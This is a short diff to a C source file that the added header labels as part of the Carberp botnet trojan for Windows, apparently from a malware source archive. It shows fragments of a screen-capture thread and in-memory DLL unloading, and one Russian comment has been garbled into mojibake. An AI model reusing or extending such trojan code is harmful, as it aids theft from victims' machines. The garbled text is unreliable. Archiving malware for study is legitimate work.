@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include "DllLoader.h"
 #include "Memory.h"
@@ -330,7 +341,7 @@ DWORD WINAPI ScreensThread( LPVOID lpData )
 
 	return 0;
 }
-void destroyScr()// надо разобраться как мочить длл
+void destroyScr()// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 {
 	MemoryFreeLibrary(hLib);
 
